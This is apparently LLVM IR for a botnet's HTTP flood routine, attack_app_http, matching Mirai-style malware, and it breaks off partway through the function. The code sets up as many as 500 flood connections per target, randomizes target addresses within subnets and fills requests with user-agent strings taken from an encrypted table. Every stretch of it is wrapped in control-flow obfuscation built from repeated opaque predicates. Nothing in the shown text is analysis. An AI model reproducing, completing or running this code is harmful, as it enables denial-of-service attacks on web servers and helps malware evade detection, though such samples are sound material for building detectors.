define void @attack_app_http(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca %struct.attack_http_state*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i16, align 2
  %20 = alloca [10241 x i8], align 16
  %21 = alloca %struct.fd_set, align 8
  %22 = alloca %struct.fd_set, align 8
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.timeval, align 8
  %26 = alloca %struct.attack_http_state*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca %struct.sockaddr_in, align 4
  %33 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %34 = alloca [10240 x i8], align 16
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca i8*, align 8
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca i8*, align 8
  %44 = alloca i32, align 4
  %45 = alloca i32, align 4
  %46 = alloca i8*, align 8
  %47 = alloca i32, align 4
  %48 = alloca i32, align 4
  %49 = alloca i8*, align 8
  %50 = alloca i32, align 4
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  %53 = alloca i32, align 4
  %54 = alloca i8*, align 8
  %55 = alloca i32, align 4
  %56 = alloca i32, align 4
  %57 = alloca i8*, align 8
  %58 = alloca i32, align 4
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  %61 = alloca i32, align 4
  %62 = alloca i32, align 4
  %63 = alloca i32, align 4
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  store i32 0, i32* %12, align 4
  store %struct.attack_http_state* null, %struct.attack_http_state** %13, align 8
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i8* @attack_get_opt_str(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 21, i8* null)
  store i8* %66, i8** %14, align 8
  %67 = load i8, i8* %7, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %69 = call i8* @attack_get_opt_str(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 20, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0))
  store i8* %69, i8** %15, align 8
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i8* @attack_get_opt_str(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 8, i8* null)
  store i8* %72, i8** %16, align 8
  %73 = load i8, i8* %7, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %75 = call i8* @attack_get_opt_str(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 22, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i32 0, i32 0))
  store i8* %75, i8** %17, align 8
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 24, i32 1)
  store i32 %78, i32* %18, align 4
  %79 = load i8, i8* %7, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 7, i32 80)
  %82 = trunc i32 %81 to i16
  store i16 %82, i16* %19, align 2
  %83 = bitcast [10241 x i8]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %83, i8 0, i64 10241, i32 16, i1 false)
  %84 = load i8*, i8** %16, align 8
  %85 = icmp eq i8* %84, null
  br i1 %85, label %105, label %86

; <label>:86:                                     ; preds = %4
  %87 = load i32, i32* @x.19
  %88 = load i32, i32* @y.20
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %86
  %95 = load i8*, i8** %17, align 8
  %96 = icmp eq i8* %95, null
  %97 = load i32, i32* @x.19
  %98 = load i32, i32* @y.20
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %96, label %105, label %122

; <label>:105:                                    ; preds = %originalBBpart2, %4
  %106 = load i32, i32* @x.19
  %107 = load i32, i32* @y.20
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %105
  %114 = load i32, i32* @x.19
  %115 = load i32, i32* @y.20
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %4199

; <label>:122:                                    ; preds = %originalBBpart2
  %123 = load i32, i32* @x.19
  %124 = load i32, i32* @y.20
  %125 = sub i32 %123, 1
  %126 = mul i32 %123, %125
  %127 = urem i32 %126, 2
  %128 = icmp eq i32 %127, 0
  %129 = icmp slt i32 %124, 10
  %130 = or i1 %128, %129
  br i1 %130, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %122
  %131 = load i8*, i8** %17, align 8
  %132 = call i32 @util_strlen(i8* %131)
  %133 = icmp sgt i32 %132, 255
  %134 = load i32, i32* @x.19
  %135 = load i32, i32* @y.20
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %133, label %142, label %143

; <label>:142:                                    ; preds = %originalBBpart28
  br label %4199

; <label>:143:                                    ; preds = %originalBBpart28
  %144 = load i8*, i8** %16, align 8
  %145 = call i32 @util_strlen(i8* %144)
  %146 = icmp sgt i32 %145, 127
  br i1 %146, label %147, label %164

; <label>:147:                                    ; preds = %143
  %148 = load i32, i32* @x.19
  %149 = load i32, i32* @y.20
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %147
  %156 = load i32, i32* @x.19
  %157 = load i32, i32* @y.20
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %4199

; <label>:164:                                    ; preds = %143
  %165 = load i8*, i8** %15, align 8
  %166 = call i32 @util_strlen(i8* %165)
  %167 = icmp sgt i32 %166, 9
  br i1 %167, label %168, label %185

; <label>:168:                                    ; preds = %164
  %169 = load i32, i32* @x.19
  %170 = load i32, i32* @y.20
  %171 = sub i32 %169, 1
  %172 = mul i32 %169, %171
  %173 = urem i32 %172, 2
  %174 = icmp eq i32 %173, 0
  %175 = icmp slt i32 %170, 10
  %176 = or i1 %174, %175
  br i1 %176, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %168
  %177 = load i32, i32* @x.19
  %178 = load i32, i32* @y.20
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %4199

; <label>:185:                                    ; preds = %164
  store i32 0, i32* %10, align 4
  br label %186

; <label>:186:                                    ; preds = %originalBBpart231, %185
  %187 = load i32, i32* @x.19
  %188 = load i32, i32* @y.20
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %186
  %195 = load i32, i32* %10, align 4
  %196 = load i8*, i8** %15, align 8
  %197 = call i32 @util_strlen(i8* %196)
  %198 = icmp slt i32 %195, %197
  %199 = load i32, i32* @x.19
  %200 = load i32, i32* @y.20
  %201 = sub i32 %199, 1
  %202 = mul i32 %199, %201
  %203 = urem i32 %202, 2
  %204 = icmp eq i32 %203, 0
  %205 = icmp slt i32 %200, 10
  %206 = or i1 %204, %205
  br i1 %206, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %198, label %207, label %268

; <label>:207:                                    ; preds = %originalBBpart220
  %208 = load i32, i32* @x.19
  %209 = load i32, i32* @y.20
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %207
  %216 = load i8*, i8** %15, align 8
  %217 = load i32, i32* %10, align 4
  %218 = sext i32 %217 to i64
  %219 = getelementptr inbounds i8, i8* %216, i64 %218
  %220 = load i8, i8* %219, align 1
  %221 = sext i8 %220 to i32
  %222 = icmp sge i32 %221, 97
  %223 = load i32, i32* @x.19
  %224 = load i32, i32* @y.20
  %225 = sub i32 %223, 1
  %226 = mul i32 %223, %225
  %227 = urem i32 %226, 2
  %228 = icmp eq i32 %227, 0
  %229 = icmp slt i32 %224, 10
  %230 = or i1 %228, %229
  br i1 %230, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %222, label %231, label %248

; <label>:231:                                    ; preds = %originalBBpart224
  %232 = load i8*, i8** %15, align 8
  %233 = load i32, i32* %10, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds i8, i8* %232, i64 %234
  %236 = load i8, i8* %235, align 1
  %237 = sext i8 %236 to i32
  %238 = icmp sle i32 %237, 122
  br i1 %238, label %239, label %248

; <label>:239:                                    ; preds = %231
  %240 = load i8*, i8** %15, align 8
  %241 = load i32, i32* %10, align 4
  %242 = sext i32 %241 to i64
  %243 = getelementptr inbounds i8, i8* %240, i64 %242
  %244 = load i8, i8* %243, align 1
  %245 = sext i8 %244 to i32
  %246 = sub nsw i32 %245, 32
  %247 = trunc i32 %246 to i8
  store i8 %247, i8* %243, align 1
  br label %248

; <label>:248:                                    ; preds = %239, %231, %originalBBpart224
  br label %249

; <label>:249:                                    ; preds = %248
  %250 = load i32, i32* @x.19
  %251 = load i32, i32* @y.20
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %249
  %258 = load i32, i32* %10, align 4
  %259 = add nsw i32 %258, 1
  store i32 %259, i32* %10, align 4
  %260 = load i32, i32* @x.19
  %261 = load i32, i32* @y.20
  %262 = sub i32 %260, 1
  %263 = mul i32 %260, %262
  %264 = urem i32 %263, 2
  %265 = icmp eq i32 %264, 0
  %266 = icmp slt i32 %261, 10
  %267 = or i1 %265, %266
  br i1 %267, label %originalBBpart231, label %originalBB26alteredBB

originalBBpart231:                                ; preds = %originalBB26
  br label %186

; <label>:268:                                    ; preds = %originalBBpart220
  %269 = load i32, i32* @x.19
  %270 = load i32, i32* @y.20
  %271 = sub i32 %269, 1
  %272 = mul i32 %269, %271
  %273 = urem i32 %272, 2
  %274 = icmp eq i32 %273, 0
  %275 = icmp slt i32 %270, 10
  %276 = or i1 %274, %275
  br i1 %276, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %268
  %277 = load i32, i32* %18, align 4
  %278 = icmp sgt i32 %277, 500
  %279 = load i32, i32* @x.19
  %280 = load i32, i32* @y.20
  %281 = sub i32 %279, 1
  %282 = mul i32 %279, %281
  %283 = urem i32 %282, 2
  %284 = icmp eq i32 %283, 0
  %285 = icmp slt i32 %280, 10
  %286 = or i1 %284, %285
  br i1 %286, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %278, label %287, label %288

; <label>:287:                                    ; preds = %originalBBpart235
  store i32 500, i32* %18, align 4
  br label %288

; <label>:288:                                    ; preds = %287, %originalBBpart235
  call void @table_unlock_val(i8 zeroext 61)
  call void @table_unlock_val(i8 zeroext 62)
  call void @table_unlock_val(i8 zeroext 63)
  call void @table_unlock_val(i8 zeroext 64)
  call void @table_unlock_val(i8 zeroext 65)
  call void @table_unlock_val(i8 zeroext 66)
  call void @table_unlock_val(i8 zeroext 67)
  call void @table_unlock_val(i8 zeroext 68)
  call void @table_unlock_val(i8 zeroext 69)
  call void @table_unlock_val(i8 zeroext 70)
  call void @table_unlock_val(i8 zeroext 71)
  %289 = load i32, i32* %18, align 4
  %290 = sext i32 %289 to i64
  %291 = call noalias i8* @calloc(i64 %290, i64 3140) #6
  %292 = bitcast i8* %291 to %struct.attack_http_state*
  store %struct.attack_http_state* %292, %struct.attack_http_state** %13, align 8
  store i32 0, i32* %9, align 4
  br label %293

; <label>:293:                                    ; preds = %644, %288
  %294 = load i32, i32* %9, align 4
  %295 = load i32, i32* %18, align 4
  %296 = icmp slt i32 %294, %295
  br i1 %296, label %297, label %647

; <label>:297:                                    ; preds = %293
  %298 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %299 = load i32, i32* %9, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %298, i64 %300
  %302 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %301, i32 0, i32 1
  store i8 0, i8* %302, align 4
  %303 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %304 = load i32, i32* %9, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %303, i64 %305
  %307 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %306, i32 0, i32 0
  store i32 -1, i32* %307, align 4
  %308 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %309 = load i32, i32* %9, align 4
  %310 = load i8, i8* %5, align 1
  %311 = zext i8 %310 to i32
  %312 = srem i32 %309, %311
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %308, i64 %313
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %314, i32 0, i32 1
  %316 = load i32, i32* %315, align 4
  %317 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %318 = load i32, i32* %9, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %317, i64 %319
  %321 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %320, i32 0, i32 4
  store i32 %316, i32* %321, align 4
  %322 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %323 = load i32, i32* %9, align 4
  %324 = sext i32 %323 to i64
  %325 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %322, i64 %324
  %326 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %325, i32 0, i32 6
  %327 = getelementptr inbounds [257 x i8], [257 x i8]* %326, i32 0, i32 0
  %328 = load i8*, i8** %17, align 8
  %329 = call i32 @util_strcpy(i8* %327, i8* %328)
  %330 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %331 = load i32, i32* %9, align 4
  %332 = sext i32 %331 to i64
  %333 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %330, i64 %332
  %334 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %333, i32 0, i32 6
  %335 = getelementptr inbounds [257 x i8], [257 x i8]* %334, i64 0, i64 0
  %336 = load i8, i8* %335, align 4
  %337 = sext i8 %336 to i32
  %338 = icmp ne i32 %337, 47
  br i1 %338, label %339, label %367

; <label>:339:                                    ; preds = %297
  %340 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %341 = load i32, i32* %9, align 4
  %342 = sext i32 %341 to i64
  %343 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %340, i64 %342
  %344 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %343, i32 0, i32 6
  %345 = getelementptr inbounds [257 x i8], [257 x i8]* %344, i32 0, i32 0
  %346 = getelementptr inbounds i8, i8* %345, i64 1
  %347 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %350, i32 0, i32 6
  %352 = getelementptr inbounds [257 x i8], [257 x i8]* %351, i32 0, i32 0
  %353 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %354 = load i32, i32* %9, align 4
  %355 = sext i32 %354 to i64
  %356 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %353, i64 %355
  %357 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %356, i32 0, i32 6
  %358 = getelementptr inbounds [257 x i8], [257 x i8]* %357, i32 0, i32 0
  %359 = call i32 @util_strlen(i8* %358)
  %360 = sext i32 %359 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %346, i8* %352, i64 %360, i32 1, i1 false)
  %361 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %362 = load i32, i32* %9, align 4
  %363 = sext i32 %362 to i64
  %364 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %361, i64 %363
  %365 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %364, i32 0, i32 6
  %366 = getelementptr inbounds [257 x i8], [257 x i8]* %365, i64 0, i64 0
  store i8 47, i8* %366, align 4
  br label %367

; <label>:367:                                    ; preds = %339, %297
  %368 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %371, i32 0, i32 10
  %373 = getelementptr inbounds [9 x i8], [9 x i8]* %372, i32 0, i32 0
  %374 = load i8*, i8** %15, align 8
  %375 = call i32 @util_strcpy(i8* %373, i8* %374)
  %376 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %377 = load i32, i32* %9, align 4
  %378 = sext i32 %377 to i64
  %379 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %376, i64 %378
  %380 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %379, i32 0, i32 9
  %381 = getelementptr inbounds [9 x i8], [9 x i8]* %380, i32 0, i32 0
  %382 = load i8*, i8** %15, align 8
  %383 = call i32 @util_strcpy(i8* %381, i8* %382)
  %384 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %387, i32 0, i32 7
  %389 = getelementptr inbounds [129 x i8], [129 x i8]* %388, i32 0, i32 0
  %390 = load i8*, i8** %16, align 8
  %391 = call i32 @util_strcpy(i8* %389, i8* %390)
  %392 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %393 = load i32, i32* %9, align 4
  %394 = load i8, i8* %5, align 1
  %395 = zext i8 %394 to i32
  %396 = srem i32 %393, %395
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 2
  %400 = load i8, i8* %399, align 4
  %401 = zext i8 %400 to i32
  %402 = icmp slt i32 %401, 32
  br i1 %402, label %403, label %433

; <label>:403:                                    ; preds = %367
  %404 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %405 = load i32, i32* %9, align 4
  %406 = load i8, i8* %5, align 1
  %407 = zext i8 %406 to i32
  %408 = srem i32 %405, %407
  %409 = sext i32 %408 to i64
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %404, i64 %409
  %411 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %410, i32 0, i32 1
  %412 = load i32, i32* %411, align 4
  %413 = call i32 @ntohl(i32 %412) #7
  %414 = call i32 @rand_next()
  %415 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %416 = load i32, i32* %9, align 4
  %417 = load i8, i8* %5, align 1
  %418 = zext i8 %417 to i32
  %419 = srem i32 %416, %418
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %415, i64 %420
  %422 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %421, i32 0, i32 2
  %423 = load i8, i8* %422, align 4
  %424 = zext i8 %423 to i32
  %425 = lshr i32 %414, %424
  %426 = add i32 %413, %425
  %427 = call i32 @htonl(i32 %426) #7
  %428 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %429 = load i32, i32* %9, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %428, i64 %430
  %432 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %431, i32 0, i32 4
  store i32 %427, i32* %432, align 4
  br label %433

; <label>:433:                                    ; preds = %403, %367
  %434 = call i32 @rand_next()
  %435 = urem i32 %434, 15
  switch i32 %435, label %635 [
    i32 0, label %436
    i32 1, label %445
    i32 2, label %454
    i32 3, label %463
    i32 4, label %488
    i32 5, label %497
    i32 6, label %506
    i32 7, label %531
    i32 8, label %556
    i32 9, label %565
    i32 10, label %574
    i32 11, label %583
    i32 12, label %608
    i32 13, label %617
    i32 14, label %626
  ]

; <label>:436:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 72)
  %437 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %438 = load i32, i32* %9, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %437, i64 %439
  %441 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %440, i32 0, i32 5
  %442 = getelementptr inbounds [512 x i8], [512 x i8]* %441, i32 0, i32 0
  %443 = call i8* @table_retrieve_val(i32 72, i32* null)
  %444 = call i32 @util_strcpy(i8* %442, i8* %443)
  call void @table_lock_val(i8 zeroext 72)
  br label %635

; <label>:445:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 73)
  %446 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %447 = load i32, i32* %9, align 4
  %448 = sext i32 %447 to i64
  %449 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %446, i64 %448
  %450 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %449, i32 0, i32 5
  %451 = getelementptr inbounds [512 x i8], [512 x i8]* %450, i32 0, i32 0
  %452 = call i8* @table_retrieve_val(i32 73, i32* null)
  %453 = call i32 @util_strcpy(i8* %451, i8* %452)
  call void @table_lock_val(i8 zeroext 73)
  br label %635

; <label>:454:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 74)
  %455 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %456 = load i32, i32* %9, align 4
  %457 = sext i32 %456 to i64
  %458 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %455, i64 %457
  %459 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %458, i32 0, i32 5
  %460 = getelementptr inbounds [512 x i8], [512 x i8]* %459, i32 0, i32 0
  %461 = call i8* @table_retrieve_val(i32 74, i32* null)
  %462 = call i32 @util_strcpy(i8* %460, i8* %461)
  call void @table_lock_val(i8 zeroext 74)
  br label %635

; <label>:463:                                    ; preds = %433
  %464 = load i32, i32* @x.19
  %465 = load i32, i32* @y.20
  %466 = sub i32 %464, 1
  %467 = mul i32 %464, %466
  %468 = urem i32 %467, 2
  %469 = icmp eq i32 %468, 0
  %470 = icmp slt i32 %465, 10
  %471 = or i1 %469, %470
  br i1 %471, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %463
  call void @table_unlock_val(i8 zeroext 75)
  %472 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %473 = load i32, i32* %9, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %475, i32 0, i32 5
  %477 = getelementptr inbounds [512 x i8], [512 x i8]* %476, i32 0, i32 0
  %478 = call i8* @table_retrieve_val(i32 75, i32* null)
  %479 = call i32 @util_strcpy(i8* %477, i8* %478)
  call void @table_lock_val(i8 zeroext 75)
  %480 = load i32, i32* @x.19
  %481 = load i32, i32* @y.20
  %482 = sub i32 %480, 1
  %483 = mul i32 %480, %482
  %484 = urem i32 %483, 2
  %485 = icmp eq i32 %484, 0
  %486 = icmp slt i32 %481, 10
  %487 = or i1 %485, %486
  br i1 %487, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %635

; <label>:488:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 76)
  %489 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %490 = load i32, i32* %9, align 4
  %491 = sext i32 %490 to i64
  %492 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %489, i64 %491
  %493 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %492, i32 0, i32 5
  %494 = getelementptr inbounds [512 x i8], [512 x i8]* %493, i32 0, i32 0
  %495 = call i8* @table_retrieve_val(i32 76, i32* null)
  %496 = call i32 @util_strcpy(i8* %494, i8* %495)
  call void @table_lock_val(i8 zeroext 76)
  br label %635

; <label>:497:                                    ; preds = %433
  call void @table_unlock_val(i8 zeroext 77)
  %498 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %499 = load i32, i32* %9, align 4
  %500 = sext i32 %499 to i64
  %501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %498, i64 %500
  %502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %501, i32 0, i32 5
  %503 = getelementptr inbounds [512 x i8], [512 x i8]* %502, i32 0, i32 0
  %504 = call i8* @table_retrieve_val(i32 77, i32* null)
  %505 = call i32 @util_strcpy(i8* %503, i8* %504)
  call void @table_lock_val(i8 zeroext 77)
  br label %635

; <label>:506:                                    ; preds = %433
  %507 = load i32, i32* @x.19
  %508 = load i32, i32* @y.20
  %509 = sub i32 %507, 1
  %510 = mul i32 %507, %509
  %511 = urem i32 %510, 2
  %512 = icmp eq i32 %511, 0
  %513 = icmp slt i32 %508, 10
  %514 = or i1 %512, %513
  br i1 %514, label %originalBB41, label %originalBB41alteredBB

originalBB41:                                     ; preds = %originalBB41alteredBB, %506
  call void @table_unlock_val(i8 zeroext 78)
  %515 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %516 = load i32, i32* %9, align 4
  %517 = sext i32 %516 to i64
  %518 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %515, i64 %517
  %519 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %518, i32 0, i32 5
  %520 = getelementptr inbounds [512 x i8], [512 x i8]* %519, i32 0, i32 0
  %521 = call i8* @table_retrieve_val(i32 78, i32* null)
  %522 = call i32 @util_strcpy(i8* %520, i8* %521)
  call void @table_lock_val(i8 zeroext 78)
  %523 = load i32, i32* @x.19
  %524 = load i32, i32* @y.20
  %525 = sub i32 %523, 1
  %526 = mul i32 %523, %525
  %527 = urem i32 %526, 2
  %528 = icmp eq i32 %527, 0
